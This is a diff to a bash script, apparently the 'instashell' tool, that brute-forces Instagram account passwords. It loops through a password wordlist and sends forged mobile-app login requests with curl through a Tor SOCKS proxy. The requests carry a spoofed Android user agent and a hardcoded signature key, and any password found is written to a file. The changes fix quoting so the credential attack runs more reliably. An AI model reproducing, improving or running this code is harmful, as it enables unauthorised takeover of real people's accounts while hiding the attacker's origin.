@@ -63,7 +63,7 @@ for pass in $(cat $wl_pass); do
 
 header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
 
-data='{"phone_id":"$phone", "_csrftoken":"$var2", "username":"'$user'", "guid":"$guid", "device_id":"$device", "password":"'$pass'", "login_attempt_count":"0"}'
+data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
 ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
 
 
@@ -73,7 +73,7 @@ check=$(curl --socks5 127.0.0.1:9050 -d "ig_sig_key_version=4&signed_body=$hmac.
 #echo $check
 if [[ "$check" == "200" ]]; then
 printf "\e[1;92m [*] Password Found: %s \n\e[0m" $pass
-printf "Username: %s, Password: %s\n" $user $pass >> found.instashell
+printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instashell
 printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m"
 exit 1
 fi
@@ -102,4 +102,3 @@ done
 }
 
 bruteforcer
-
